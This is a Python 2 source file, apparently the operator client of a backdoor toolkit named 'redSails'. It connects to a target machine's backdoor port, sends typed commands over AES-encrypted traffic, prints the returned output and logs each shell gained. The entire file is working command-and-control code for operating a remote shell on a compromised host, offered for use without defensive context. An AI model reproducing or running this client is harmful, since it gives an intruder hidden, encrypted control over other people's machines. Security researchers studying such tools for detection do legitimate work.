#!/usr/bin/python

import socket
import sys
import time

from optparse import OptionParser

from rsClientCrypto.rsCrypto import AESCipher

BANNER = """
        @@@@@@@   @@@@@@@@  @@@@@@@              ,/|\,  
        @@@@@@@@  @@@@@@@@  @@@@@@@@           ,/' |\ \,  
        @@!  @@@  @@!       @@!  @@@         ,/'   | |  \  
        !@!  @!@  !@!       !@!  @!@       ,/'     | |   |  
        @!@!!@!   @!!!:!    @!@  !@!     ,/'       |/    |  
        !!@!@!    !!!!!:    !@!  !!!    ,/__SAILS__|-----'
        !!: :!!   !!:       !!:  !!!  ___.....-----''-----/
        :!:  !:!  :!:       :!:  !:!  \    o  o  o  o    / 
        ::~ ~:::~ ~::~::::~ :::: ::~^-^~^`~^~^~`~^~`~^^~^~-^~^
        ~-^~^-`~^~-^~^`^~^-^~^`^~^-~^~-^~^-`~^~-^~^`^~^-^~^`^~ 
        
        """

# Starting shell handler
def shell(sock, target, password):
    AESCrypto = AESCipher(password)
    more = True
    resp = ""
    cmd = ""
    line = ""
    term = "redsails> "
    try:
        with open("redSails.log", "a") as xpltLog:
            xpltLog.write("*** Gained command shell on host " + str(target) + "\r\n")
            
            print BANNER

            while True:
                cmd = raw_input(term)
                
                if cmd.strip().lower() == "exit":
                    sock.send(AESCrypto.encrypt(cmd.strip()))
                    return

                else:
                    sock.send(AESCrypto.encrypt(cmd.strip()))

                    completeResponse = ""
                    resp = AESCrypto.decrypt(sock.recv(2048))
                    
                    while resp.strip() != "SEG::END":
                        completeResponse += resp

                        dSEGMOORE = "SEG::MORE"
                        sock.send(AESCrypto.encrypt(dSEGMOORE))

                        resp = AESCrypto.decrypt(sock.recv(2048))

                    print completeResponse

    except Exception as e:
        print "[!] Received an ERROR in shell() - \n%s" % e
        sock.close()
        return
    
    # Because you just never know, thats why...
    sock.close()
    return

def main():
    parser = OptionParser()
    parser.add_option("-p", "--password", action="store", dest="password",
                help="Password used to encrypt/decrypt backdoor traffic",
                type=str, default=None)

    parser.add_option("-t", "--target-ip", action="store", dest="target_ip",
                help="Target IP address with backdoor installed",
                type=str, default=None)

    parser.add_option("-o", "--open-port", action="store", dest="open_port",
                help="Open backdoor port on target machine",
                type=int, default=None)

    (options, args) = parser.parse_args()

    if (options.password == None) or (options.target_ip == None) or (options.open_port == None):
        print BANNER
        parser.print_help()
        return 0

    target_ip = options.target_ip
    target_port = options.open_port

    try:

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))

    except Exception as e:
        print "[!] Failed to connect to backdoor..."
        print e

    shell(s, target_ip, options.password)

    print "[-] Disconnected from " + target_ip

    try:
        s.close()
        sys.exit(0)

    except Exception as e:
        print "[!] Graceful connection close failed..."
        print e
        sys.exit(1)

if __name__ == '__main__':
    main()
